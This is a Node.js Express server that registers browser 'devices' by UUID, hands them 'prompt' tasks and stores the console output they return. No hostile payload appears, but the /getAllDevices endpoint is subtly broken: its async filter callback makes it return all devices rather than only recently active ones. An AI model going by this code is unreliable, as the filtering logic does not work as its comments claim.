const express = require('express');
const cors = require('cors');
const path = require('path');
const { QuickDB } = require('quick.db');
const moment = require('moment');
const db = new QuickDB();
const app = express();
const port = 8000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Set up EJS view engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Initialize QuickDB for tasks and devices
const tasksDB = db.table('tasks');
const devicesDB = db.table('devices');
const pointers = db.table('pointers'); // Store the task ID tracker here

// Endpoint to get current tasks
app.get('/prompts', async (req, res) => {
  const tasks = await tasksDB.all();
  res.json(tasks.map(task => task.data));
});

// Endpoint to display the add-task form
app.get('/add-task', async (req, res) => {
  const devices = await devicesDB.all(); // Get all devices
  res.render('add-task', { devices }); // Pass devices to the form for selection
});

// Endpoint to handle task submission from the form
app.post('/add-task', async (req, res) => {
  const { prompt, devices } = req.body; // 'devices' is an array of UUIDs
  
  // Get the next task ID from the tracker and increment it
  let taskId = await pointers.get('currentId') || 0;
  taskId += 1;
  await pointers.set('currentId', taskId); // Update the tracker

  // Create the new task object
  const newTask = {
    id: taskId,
    prompt,         // The task prompt from the form
    devices         // Array of device UUIDs selected by the user
  };

  // Store the task in the database
  await tasksDB.set(taskId.toString(), newTask); // Use taskId.toString() as the key
  
  // Respond with the new task data
  res.json(newTask);
});

// Endpoint to receive ping from devices
app.post('/ping', async (req, res) => {
  const { uuid, browserDetails } = req.body;
//   console.log('Ping received with body:', req.body);  // Log the request body
  
  const existingDevice = await devicesDB.get(uuid);
  
  if (existingDevice) {
    // If device exists, update it with new browser details and lastPing timestamp
    await devicesDB.set(uuid, { ...existingDevice, browserDetails, lastPing: moment().unix() });
  } else {
    // If device is new, add it to the database with its UUID, browserDetails, and timestamp
    await devicesDB.set(uuid, { uuid, browserDetails, lastPing: moment().unix() });
  }

//   console.log(`Received ping from device: ${uuid}`);
  res.json({ status: 'success', message: 'Device ping received' });
});

// Endpoint to get all active devices (pinged in the last 60 seconds)
app.get('/getAllDevices', async (req, res) => {
  const devices = await devicesDB.all();
  const currentTime = moment().unix();

  const activeDevices = await devices.filter(async device => {
    const lastPing = await device.data?.lastPing;
    return lastPing && (await currentTime - await lastPing <= 60); // Devices pinged in the last 60 seconds
  });

  await res.json(await activeDevices);
});

// Endpoint to handle prompt completion
app.post('/promptComplete/:id', async (req, res) => {
    const { id } = req.params;
    const { uuid, consoleOutput } = req.body;  // Get the device UUID and console output from the body
  
    // Check if the task exists
    const task = await tasksDB.get(id);
  
    if (!task) {
      return res.status(404).json({ status: 'error', message: `Task with ID ${id} not found` });
    }
  
    // If the task already has a completedDevices field, add to it; otherwise, initialize it as an empty array
    const completedDevices = await task.completedDevices || [];
  
    // Add the completed device's UUID and console output to the completedDevices array
    await completedDevices.push({
      uuid,
      consoleOutput: JSON.stringify(consoleOutput)  // Ensure the console output is stored as a JSON string
    });
  
    // Update the task in the database with the new completedDevices list
    await tasksDB.set(id, { ...task, completedDevices });
  
    console.log(`Prompt ${id} completed by device ${uuid} with response: ${consoleOutput}`);
  
    await res.json({
      status: 'success',
      message: `Prompt ${id} completed`,
      completedDevices // Return the updated list of completed devices
    });
  });
  

// Scheduled task to remove devices with no ping in the last 60 seconds
setInterval(async () => {
  const currentTime = await moment().unix();
  const devices = await devicesDB.all();
  
  await devices.forEach(async (device) => {
    if (await currentTime - await device.data?.lastPing > 60) {  // Remove devices that haven't pinged in the last 60 seconds
      await devicesDB.delete(device.id);
      console.log(`Removed device ${device.id} due to inactivity`);
    }
  });
}, 60000);  // Run every 60 seconds

// Start server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});
